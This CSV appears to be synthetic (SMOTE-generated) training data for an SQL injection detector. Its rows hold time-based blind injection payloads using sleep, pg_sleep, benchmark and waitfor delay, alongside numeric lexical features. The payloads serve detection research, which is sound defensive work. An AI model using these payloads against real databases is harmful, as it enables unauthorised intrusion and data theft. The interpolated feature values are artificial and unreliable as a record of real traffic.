id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000097,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000050,0.787495961332572,72.5058810514823,23.50588105148231,3.522907462609703,17.0,19.0,28.0,8.505881051482309,0.2344970011495497,0.26208488363773197,0.3862303548345524,0.11718776037816589,0.252940525741155,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.2529405257411549,0.0,1.0,1.0,0.2529405257411549,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000098,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000003,1.5784830996817683,81.9364548124148,26.0,3.6027587594464023,19.468227406207397,22.558528425775926,31.909698980431475,8.0,0.23505214383052458,0.2773850345095455,0.3889775728526833,0.09858524880724667,0.4414715742240751,0.0,0.0,0.0,0.0,1.0,0.0,5.558528425775925,0.0,0.0,1.0,1.0,0.4414715742240751,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.5585284257759249,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5585284257759247
SMOTE_000099,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000006,2.090107257456425,85.01479808926777,26.780518164679215,3.6609752966207347,23.66831089880753,14.448829063486745,33.67324359523012,13.224414531743372,0.2828359653833043,0.16660825530948373,0.3948052287563886,0.15575055055082337,4.0,0.0,0.0,0.0,0.0,1.556103632935843,0.0,5.112207265871686,0.0,0.0,0.5561036329358431,3.556103632935843,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000100,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000034,0.727846742590527,56.520718303091186,21.85946127268161,3.6632861461714814,23.0,3.6198204242272034,18.900897878863983,11.0,0.4074032292847158,0.06440901390450893,0.33334273410938947,0.19484502270138582,5.619820424227203,0.0,0.0,0.0,0.0,1.0,0.0,2.380179575772796,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000101,attack,time,"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",nearest_attack_euclidean,R000032,1.970686150347211,55.51493010898111,17.514930108981112,3.191497955888509,22.485069891018888,1.4850698910188864,23.544790326943335,8.0,0.4051413803569718,0.0268340856454794,0.4239074693455517,0.1441170646519971,0.0,3.4850698910188873,0.0,0.0,0.0,0.5149301089811128,0.0,4.0,0.0,0.0,0.0,0.5149301089811129,0.0,1.0,0.0,0.0,0.0,0.5149301089811129,1.0,0.0,0.0,0.0,0.0,0.5149301089811128,0.0,0.0,0.0,1.4850698910188873,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000102,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000084,0.5068418318791152,57.94103579035392,20.79422315723456,3.5404639528195037,23.0,3.2647410524115195,20.676294737942403,11.0,0.3973362640437164,0.05663994290330289,0.3559934059016381,0.19003038715134263,5.2647410524115195,0.0,0.0,0.0,0.0,1.0,0.0,2.7352589475884805,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000103,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000001,2.128693769985066,64.97579876007924,26.562785271456875,4.085871158941382,31.550684651496496,3.2874429457086247,17.0,13.137671162874124,0.48164539772081283,0.05188568299701117,0.26440353651611403,0.20206538276606195,4.574885891417251,0.0,1.4251141085827492,0.0,0.0,0.2874429457086255,0.0,2.0,0.0,0.7125570542913746,0.7125570542913746,3.137671162874124,1.0,0.0,0.7125570542913746,0.0,0.0,0.2874429457086254,1.0,0.0,0.0,0.0,0.0,0.7125570542913746,0.0,0.0,0.0,0.28744294570862533,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000104,attack,time,"1 where 1842  =  1842 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000099,0.3733782638616728,85.54068669973151,24.805424893297534,3.7256092267162835,21.513562233243835,26.221699573190136,29.805424893297534,8.0,0.25124278526470634,0.30582524297171,0.34911420254229575,0.09381776922128798,0.0,0.0,0.0,0.0,0.0,1.9027124466487668,0.0,4.097287553351233,0.0,0.0,1.0,1.9027124466487668,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.9027124466487668,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.902712446648767
SMOTE_000105,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000145,1.4994530111678783,58.115844666430974,23.628051777856342,3.6510136919048195,19.115844666430977,10.0,22.0,7.0,0.32851401812596726,0.1721758927882135,0.3787869641340697,0.12052312495174945,0.3719482221436592,0.6280517778563407,2.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,0.37194822214365947,0.6280517778563407,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.6280517778563406,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6280517778563404
SMOTE_000106,attack,time,"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",nearest_attack_euclidean,R000032,1.9659603217345083,56.02136572600473,17.510682863002366,3.174652029225003,22.489317136997634,1.4893171369976361,24.042731452009463,8.0,0.4017291964391582,0.026752698910003342,0.42866991511592223,0.14284818953491615,0.0,3.4893171369976343,0.0,0.0,0.0,0.5106828630023652,0.0,4.0,0.0,0.0,0.0,0.5106828630023654,0.0,1.0,0.0,0.0,0.0,0.5106828630023652,1.0,0.0,0.0,0.0,0.0,0.5106828630023652,0.0,0.0,0.0,1.4893171369976348,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000107,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000038,0.8964943815804199,60.793544665311785,21.19953890466513,3.34791638982823,15.0,11.59631123732102,25.997694523325638,8.199538904665127,0.24858640565620768,0.18789525984470817,0.42816754447320216,0.13535079002588196,0.0,0.0,2.0,0.0,0.0,1.1995389046651275,0.0,4.0,0.0,0.0,1.0,3.1995389046651277,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.19953890466512747,0.0,0.8004610953348725,0.19953890466512747,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1995389046651272
SMOTE_000108,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",nearest_attack_euclidean,R000053,0.44281144371486647,91.20781994339859,28.0,3.8505225568148003,26.0,22.0,31.76625595471887,11.441563988679716,0.2856198707832978,0.24167835220125197,0.34740235860492813,0.1252994184105221,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.441563988679717,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000109,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000141,1.35111044812412,93.7782503912124,27.061833420269423,3.605539835594656,27.18550026080827,18.0,38.06183342026942,10.530916710134711,0.28901989381137794,0.19238609183193955,0.40629533477747304,0.1122986795792095,0.0,0.5309167101347114,2.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,0.0,4.0,0.0,0.5309167101347114,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000110,attack,time,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000046,0.4879593176897518,70.72306277182261,28.0,3.849311622111954,16.0,21.0,24.578450217458087,9.144612554364523,0.22636780869539774,0.2971077489127095,0.34726438260920445,0.1292600597826882,0.8553874456354779,0.14461255436452214,0.0,0.0,0.0,1.0,0.0,4.144612554364522,1.0,0.0,1.0,1.0,0.8553874456354779,0.1446125543645222,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000111,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,0.07689716672753236,70.19195721883598,20.88002673822751,3.0002481295952776,20.952010695291005,2.0,36.19195721883598,11.047989304708995,0.2986464555082078,0.028501114571854946,0.5154810522784657,0.1573713776414714,4.0,0.0,0.0,0.0,0.0,1.0,0.0,6.047989304708996,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.023994652354498,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.023994652354498
SMOTE_000112,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000119,0.5572529578093034,64.0,22.17354712341323,3.3762975235206194,18.0,10.0,28.0,8.0,0.28125,0.15625,0.4375,0.125,0.17354712341323042,0.8264528765867696,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,0.1735471234132306,0.8264528765867698,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000113,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,nearest_attack_euclidean,R000120,2.7863259255178408,82.22911221054476,27.581012467838306,3.6555130516221777,28.797045715407123,10.0,33.79704571540712,9.63502077973051,0.3485959021370209,0.1250323340394044,0.4111120691567231,0.11525969466685161,2.1080166237844087,0.0,0.0,0.0,0.0,1.0,0.0,5.054008311892204,0.0,1.0,0.0,1.0,0.5270041559461023,0.0,0.0,0.47299584405389783,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.5270041559461022,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.527004155946102
SMOTE_000114,attack,time,1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000109,0.35444834588263396,91.36416733324815,21.364167333248147,2.8411769692511997,28.364167333248147,2.0,49.0,12.0,0.31040323076859666,0.02189196092798107,0.5363530427355359,0.13135176556788636,0.0,0.0,0.0,0.0,1.0,0.0,0.0,10.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.8179163333759254,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.817916333375925
SMOTE_000115,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,0.989585253604962,60.46066104608538,17.539338953914623,3.0344007820215992,22.539338953914623,1.0,27.921322092170755,9.0,0.37309395197969264,0.01654330062626136,0.46147304175769377,0.1488897056363522,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.730330523042689,0.0,0.26966947695731136,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7303305230426888,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7303305230426886
SMOTE_000116,attack,time,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""bvgg""  =  ""bvgg",nearest_attack_euclidean,R000093,1.7887183985864694,71.39696444897615,16.58731027806101,2.729173376458634,20.23806916581697,1.5873102780610093,38.222343892854134,11.349241112244039,0.28950104847046665,0.02171552373672589,0.5309918089097749,0.15779161888303248,0.0,3.5873102780610093,0.0,0.0,0.0,1.0,0.0,6.761930834183029,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.41268972193899034,0.0,0.0,0.0,1.5873102780610098,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000117,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000077,0.05162003600223101,64.11734238913581,23.023468477827162,3.3932078739088873,17.976531522172838,10.09387391130865,28.023468477827162,8.023468477827162,0.2804868780436269,0.1572707995000835,0.4371233943591925,0.1251189280970971,1.0,0.0,2.0,0.0,0.0,1.0117342389135813,0.0,4.0,0.0,0.0,0.011734238913581274,3.011734238913581,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.011734238913581052,0.9882657610864188,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000118,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000014,1.256858770146551,58.22964660413458,18.61482330206729,3.122123543976321,20.91858641653832,1.0,26.54070679173084,9.77035339586542,0.3582173892585581,0.017178219861987934,0.45648544026427446,0.16811895061517945,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.38517669793271,0.38517669793270987,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000119,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000110,1.428153898120765,74.35941715617382,18.17970857808691,2.914268565262743,26.17970857808691,1.589854289043453,37.17970857808691,9.410145710956547,0.3519652026165775,0.021218949498347017,0.5,0.1268158478850755,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.41014571095654606,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.5898542890434539,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.589854289043454
SMOTE_000120,attack,time,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000101,0.3520303749508751,86.15411972371102,28.0,3.6816081065990263,25.443892201427314,18.0,33.53267064171278,9.177556880570926,0.29518341464928527,0.20927080972067247,0.38909856586592106,0.1064472097641212,0.0,0.08877844028546272,2.0,0.0,0.0,2.0,0.0,4.088778440285463,0.0,1.0,0.0,4.0,0.0,0.08877844028546267,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.9112215597145373,0.08877844028546267,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000121,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000006,2.3945655816818676,85.58331646413096,27.369045209161566,3.6766447140556475,24.184522604580785,14.738090418323132,34.1071356274847,12.553567813742351,0.2885575647752968,0.16899672407335822,0.3976756034311831,0.14477010772016188,3.184522604580783,0.0,0.0,0.0,0.0,1.5922613022903915,0.0,5.184522604580783,0.0,0.0,0.5922613022903915,3.592261302290392,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.40773869770960836,0.5922613022903915,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000122,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000071,0.01931367866128522,83.96942535124278,20.006114929751444,2.9436962115543803,29.987770140497112,2.0,41.98165521074567,10.0,0.3571262705341281,0.023818738592151056,0.49996129791296556,0.1190936929607553,0.0,0.006114929751444231,0.0,0.0,1.0,0.0,0.0,8.993885070248556,0.0,0.0,0.0,1.0,0.0,0.006114929751444231,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.006114929751444231,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.006114929751444
SMOTE_000123,attack,time,1%'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000124,1.4435506036717658,75.54213016392231,24.757021693987053,3.3656370280420678,19.378510846993528,10.0,34.78510846993526,11.378510846993526,0.25752143170236147,0.1331374000272827,0.45832965658982044,0.15101151168053537,1.0,0.0,2.0,0.0,0.0,1.0,0.0,5.757021693987053,0.6214891530064736,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.3785108469935263,0.6214891530064737,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000124,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000134,1.06263119603951,68.68876038725762,21.763482884804116,3.3906600676785885,15.0,16.107863078432928,28.81741442402058,8.763482884804116,0.22022715378140223,0.23164953416583658,0.4200649010804006,0.12805841097236056,0.0,0.0,2.0,0.0,0.0,1.7634828848041157,0.0,4.0,0.0,0.0,1.0,3.763482884804116,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.763482884804116,0.0,0.23651711519588414,0.763482884804116,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.763482884804116
SMOTE_000125,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000145,0.04340169261383066,57.02365837923696,23.964512431144556,3.640777481483868,18.035487568855444,10.0,22.0,6.9881708103815185,0.3162643296457017,0.17536824745989604,0.38581014441177125,0.12255727848263093,0.0,0.9881708103815189,2.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,0.0,0.988170810381519,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.9881708103815189,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.988170810381519
SMOTE_000126,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000014,0.7953204272034101,63.330243237524456,19.330243237524456,3.1386130319195145,23.553495491682973,1.0,29.0,9.776747745841487,0.371797611108382,0.015796556547765253,0.45810013988519227,0.1543056924586605,3.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.7767477458414861,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.22325225415851396,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2232522541585142
SMOTE_000127,attack,time,1%'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000124,0.46446242591201514,71.0,24.0,3.440803836065857,19.0,10.0,31.0,11.0,0.2676056338028169,0.14084507042253522,0.43661971830985913,0.15492957746478872,0.8548035001844617,0.14519649981553828,2.0,0.0,0.0,1.0,0.0,5.0,1.0,1.0,0.0,3.0,0.8548035001844616,0.14519649981553817,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000128,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000003,0.06176989985997344,88.83932390256638,26.0,3.57680580208264,22.875029701996063,22.964294200570304,34.982147100285154,8.017852899714848,0.2573838755222786,0.2584996817544566,0.3938251060864545,0.09029133663681047,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.01785289971484791,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9821471002851521,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.982147100285152
